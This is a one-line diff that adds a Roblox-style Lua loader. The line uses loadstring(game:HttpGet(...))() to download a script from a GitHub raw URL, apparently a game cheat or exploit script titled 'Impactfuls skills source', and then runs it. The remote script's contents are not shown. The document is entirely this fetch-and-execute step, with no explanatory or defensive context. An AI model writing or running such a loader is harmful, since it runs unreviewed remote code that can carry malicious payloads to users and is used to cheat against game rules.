@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1mpactfuls/Impactfuls-skills/refs/heads/main/Impactfuls%20skills%20source"))()
